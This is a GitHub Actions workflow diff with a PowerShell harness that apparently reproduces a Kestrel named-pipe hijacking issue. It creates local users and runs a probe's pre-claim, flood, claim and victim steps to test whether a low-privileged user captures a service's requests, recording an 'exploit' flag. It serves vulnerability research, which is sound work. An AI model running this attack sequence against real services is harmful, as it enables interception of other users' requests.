@@ -1,0 +1,260 @@
+name: Kestrel Named Pipe Lifecycle E2E 20261116
+
+on:
+  push:
+    branches:
+      - research/namedpipe-residual-20261116
+    paths:
+      - research/namedpipe-residual/**
+      - .github/workflows/namedpipe-residual-e2e-20261116.yml
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  windows-e2e:
+    name: Windows current-release E2E (${{ matrix.sdk }})
+    runs-on: windows-latest
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - sdk: 10.0.404
+            tfm: net10.0
+            project: Probe.net10.csproj
+            executable: Probe.net10.exe
+          - sdk: 11.0.100
+            tfm: net11.0
+            project: Probe.net11.csproj
+            executable: Probe.net11.exe
+
+    steps:
+      - name: Checkout candidate branch
+        uses: actions/checkout@v4
+
+      - name: Install exact SDK
+        uses: actions/setup-dotnet@v5
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Build exact current-release probe
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          New-Item -ItemType Directory -Force evidence | Out-Null
+          dotnet --info 2>&1 | Tee-Object -FilePath "evidence/dotnet-info-${{ matrix.sdk }}.txt"
+          dotnet build "research/namedpipe-residual/${{ matrix.project }}" -c Release --nologo 2>&1 |
+            Tee-Object -FilePath "evidence/build-${{ matrix.sdk }}.log"
+          if ($LASTEXITCODE -ne 0) { throw "build failed: $LASTEXITCODE" }
+
+      - name: Execute cross-principal lifecycle matrix
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          Set-StrictMode -Version Latest
+
+          $sdk = '${{ matrix.sdk }}'
+          $tfm = '${{ matrix.tfm }}'
+          $exeName = '${{ matrix.executable }}'
+          $exe = Join-Path $PWD "research/namedpipe-residual/bin/Release/$tfm/$exeName"
+          if (-not (Test-Path -LiteralPath $exe)) { throw "probe missing: $exe" }
+
+          $suffix = ([Guid]::NewGuid().ToString('N')).Substring(0,8)
+          $svcUser = "zdbsvc$suffix"
+          $lowUser = "zdblow$suffix"
+          $password = "Zdb!${suffix}xA7#29"
+          $secure = ConvertTo-SecureString $password -AsPlainText -Force
+          $svcCredential = [pscredential]::new("$env:COMPUTERNAME\$svcUser", $secure)
+          $lowCredential = [pscredential]::new("$env:COMPUTERNAME\$lowUser", $secure)
+          $root = "C:\zdbnp-$suffix"
+          New-Item -ItemType Directory -Force -Path $root | Out-Null
+
+          function Wait-Path([string]$Path, [int]$Seconds = 30) {
+            $deadline = [DateTime]::UtcNow.AddSeconds($Seconds)
+            while ([DateTime]::UtcNow -lt $deadline) {
+              if (Test-Path -LiteralPath $Path) { return }
+              Start-Sleep -Milliseconds 100
+            }
+            throw "timeout waiting for $Path"
+          }
+
+          function Start-UserProcess(
+            [pscredential]$Credential,
+            [string[]]$Arguments,
+            [string]$Stdout,
+            [string]$Stderr
+          ) {
+            $argumentLine = ($Arguments | ForEach-Object {
+              if ($_ -match '[\s\"]') { '"' + ($_ -replace '"','\"') + '"' } else { $_ }
+            }) -join ' '
+            return Start-Process -FilePath $exe -ArgumentList $argumentLine -Credential $Credential `
+              -WorkingDirectory $PWD -LoadUserProfile -WindowStyle Hidden -PassThru `
+              -RedirectStandardOutput $Stdout -RedirectStandardError $Stderr
+          }
+
+          function Wait-Exit([System.Diagnostics.Process]$Process, [int]$Seconds, [string]$Name) {
+            if (-not $Process.WaitForExit($Seconds * 1000)) {
+              try { Stop-Process -Id $Process.Id -Force -ErrorAction SilentlyContinue } catch {}
+              throw "$Name did not exit within $Seconds seconds"
+            }
+            $Process.Refresh()
+            return $Process.ExitCode
+          }
+
+          try {
+            & net.exe user $svcUser $password /add /y | Out-Null
+            if ($LASTEXITCODE -ne 0) { throw 'failed to create service user' }
+            & net.exe user $lowUser $password /add /y | Out-Null
+            if ($LASTEXITCODE -ne 0) { throw 'failed to create low user' }
+
+            & icacls.exe $root /inheritance:r /grant:r `
+              "$env:COMPUTERNAME\$svcUser:(OI)(CI)F" `
+              "$env:COMPUTERNAME\$lowUser:(OI)(CI)F" `
+              "${env:USERNAME}:(OI)(CI)F" | Out-File -Encoding utf8 "evidence/icacls-$sdk.txt"
+            if ($LASTEXITCODE -ne 0) { throw 'icacls failed' }
+
+            $lowSid = ([System.Security.Principal.NTAccount]::new("$env:COMPUTERNAME", $lowUser)).Translate([System.Security.Principal.SecurityIdentifier]).Value
+            $svcSid = ([System.Security.Principal.NTAccount]::new("$env:COMPUTERNAME", $svcUser)).Translate([System.Security.Principal.SecurityIdentifier]).Value
+            [ordered]@{
+              sdk = $sdk
+              framework = $tfm
+              machine = $env:COMPUTERNAME
+              serviceUser = $svcUser
+              serviceSid = $svcSid
+              lowUser = $lowUser
+              lowSid = $lowSid
+              probeSha256 = (Get-FileHash -Algorithm SHA256 -LiteralPath $exe).Hash.ToLowerInvariant()
+            } | ConvertTo-Json | Set-Content -Encoding utf8 "evidence/environment-$sdk.json"
+
+            $matrix = @()
+            for ($repeat = 1; $repeat -le 3; $repeat++) {
+              $state = Join-Path $root "r$repeat"
+              New-Item -ItemType Directory -Force -Path $state | Out-Null
+              $pipe = "zdb-kestrel-$suffix-$repeat"
+              $stop = Join-Path $state 'stop.txt'
+              $release = Join-Path $state 'release.txt'
+              $serverOut = Join-Path $state 'server.stdout.txt'
+              $serverErr = Join-Path $state 'server.stderr.txt'
+
+              $server = Start-UserProcess $svcCredential @('server',$pipe,$state,$lowSid,$stop) $serverOut $serverErr
+              Wait-Path (Join-Path $state 'host-ready.json') 40
+
+              $pre = Start-UserProcess $lowCredential @('claim',$pipe,$state,'pre',$svcSid,'5') `
+                (Join-Path $state 'pre.stdout.txt') (Join-Path $state 'pre.stderr.txt')
+              $preRc = Wait-Exit $pre 15 'pre-claim'
+              Wait-Path (Join-Path $state 'claim-pre.json') 5
+              $preReceipt = Get-Content -Raw (Join-Path $state 'claim-pre.json') | ConvertFrom-Json
+              if ($preRc -ne 0 -or $preReceipt.success) { throw "pre-claim control failed repeat $repeat rc=$preRc success=$($preReceipt.success)" }
+
+              $flood = Start-UserProcess $lowCredential @('flood',$pipe,$state,$release) `
+                (Join-Path $state 'flood.stdout.txt') (Join-Path $state 'flood.stderr.txt')
+              Wait-Path (Join-Path $state 'flood-ready.json') 60
+              $floodReady = Get-Content -Raw (Join-Path $state 'flood-ready.json') | ConvertFrom-Json
+
+              $claim = Start-UserProcess $lowCredential @('claim',$pipe,$state,'post',$svcSid,'35') `
+                (Join-Path $state 'claim.stdout.txt') (Join-Path $state 'claim.stderr.txt')
+              Start-Sleep -Milliseconds 300
+              Set-Content -Encoding ascii -Path $release -Value 'release'
+              $floodRc = Wait-Exit $flood 45 'flood'
+
+              $claimReady = $false
+              try {
+                Wait-Path (Join-Path $state 'claim-post-ready.txt') 35
+                $claimReady = $true
+              } catch {
+                $claimReady = $false
+              }
+
+              $victimRc = -1
+              $captured = $false
+              $marker = "zdb-marker-$sdk-r$repeat-$suffix"
+              if ($claimReady) {
+                $victim = Start-UserProcess $svcCredential @('victim',$pipe,$marker,(Join-Path $state 'victim-response.txt'),'15000') `
+                  (Join-Path $state 'victim.stdout.txt') (Join-Path $state 'victim.stderr.txt')
+                $victimRc = Wait-Exit $victim 25 'victim'
+                $claimRc = Wait-Exit $claim 45 'claim'
+                if (Test-Path (Join-Path $state 'captured-request.txt')) {
+                  $capturedText = Get-Content -Raw (Join-Path $state 'captured-request.txt')
+                  $captured = $capturedText.Contains($marker, [StringComparison]::Ordinal)
+                }
+              } else {
+                $claimRc = Wait-Exit $claim 45 'claim'
+              }
+
+              Set-Content -Encoding ascii -Path $stop -Value 'stop'
+              $serverRc = Wait-Exit $server 35 'server'
+              $realVictimHit = Test-Path (Join-Path $state 'real-victim-hit.txt')
+              $claimReceipt = $null
+              if (Test-Path (Join-Path $state 'claim-post.json')) {
+                $claimReceipt = Get-Content -Raw (Join-Path $state 'claim-post.json') | ConvertFrom-Json
+              }
+
+              $row = [ordered]@{
+                sdk = $sdk
+                repeat = $repeat
+                preClaimBlocked = (-not [bool]$preReceipt.success)
+                floodConnected = [int]$floodReady.connected
+                floodFailure = $floodReady.failure
+                floodExit = $floodRc
+                postClaimReady = $claimReady
+                postClaimSuccess = if ($null -eq $claimReceipt) { $false } else { [bool]$claimReceipt.success }
+                claimExit = $claimRc
+                victimExit = $victimRc
+                victimRequestCaptured = $captured
+                realKestrelVictimHit = $realVictimHit
+                serverExit = $serverRc
+                exploit = ($claimReady -and $captured -and -not $realVictimHit -and $victimRc -eq 0 -and $claimRc -eq 0)
+              }
+              $matrix += [pscustomobject]$row
+              $row | ConvertTo-Json -Depth 6 | Set-Content -Encoding utf8 (Join-Path $state 'FINAL_RESULT.json')
+            }
+
+            $matrix | ConvertTo-Json -Depth 6 | Set-Content -Encoding utf8 "evidence/matrix-$sdk.json"
+            $matrix | Format-Table -AutoSize | Out-String | Set-Content -Encoding utf8 "evidence/matrix-$sdk.txt"
+            $exploitCount = @($matrix | Where-Object exploit).Count
+            $allControls = @($matrix | Where-Object { -not $_.preClaimBlocked }).Count -eq 0
+            [ordered]@{
+              sdk = $sdk
+              repeats = $matrix.Count
+              exploitCount = $exploitCount
+              allPreClaimControlsBlocked = $allControls
+              verdict = if ($exploitCount -gt 0) { 'CANDIDATE_REPRODUCED' } else { 'NOT_REPRODUCED' }
+            } | ConvertTo-Json | Set-Content -Encoding utf8 "evidence/summary-$sdk.json"
+
+            Get-ChildItem -LiteralPath $root -Recurse -File | Copy-Item -Destination {
+              $relative = $_.FullName.Substring($root.Length).TrimStart('\')
+              $destination = Join-Path $PWD (Join-Path 'evidence/state' $relative)
+              New-Item -ItemType Directory -Force -Path (Split-Path $destination) | Out-Null
+              $destination
+            }
+          }
+          finally {
+            Get-Process -ErrorAction SilentlyContinue | Where-Object {
+              $_.Path -eq $exe
+            } | Stop-Process -Force -ErrorAction SilentlyContinue
+            & net.exe user $svcUser /delete 2>$null | Out-Null
+            & net.exe user $lowUser /delete 2>$null | Out-Null
+          }
+
+      - name: Hash evidence
+        if: always()
+        shell: pwsh
+        run: |
+          Get-ChildItem evidence -Recurse -File |
+            Sort-Object FullName |
+            ForEach-Object {
+              $hash = (Get-FileHash -Algorithm SHA256 -LiteralPath $_.FullName).Hash.ToLowerInvariant()
+              $relative = [IO.Path]::GetRelativePath((Join-Path $PWD 'evidence'), $_.FullName)
+              "$hash  $relative"
+            } | Set-Content -Encoding utf8 "evidence/SHA256SUMS-${{ matrix.sdk }}.txt"
+
+      - name: Upload exact-release evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: namedpipe-lifecycle-${{ matrix.sdk }}-${{ github.run_id }}
+          path: evidence
+          if-no-files-found: error
+          retention-days: 5
